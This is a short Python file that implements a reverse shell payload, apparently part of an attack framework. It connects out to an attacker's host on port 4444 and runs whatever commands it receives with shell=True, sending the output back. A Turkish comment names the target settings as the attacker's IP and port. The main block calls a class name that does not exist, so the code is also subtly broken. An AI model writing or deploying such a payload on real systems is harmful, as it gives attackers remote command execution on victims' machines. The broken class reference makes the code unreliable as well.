import socket
import subprocess

class IntPayload:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def connect(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.lhost, self.lport))

        while True:
            s.send(b"int4 > ")
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break

            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            s.send(output.stdout.encode() + output.stderr.encode())

        s.close()

    def execute(self):
        self.connect()

if __name__ == "__main__":
    # Saldırganın IP ve port bilgileri
    lhost = "?"
    lport = 4444

    payload = IntFrameworkPayload(lhost, lport)
    payload.execute()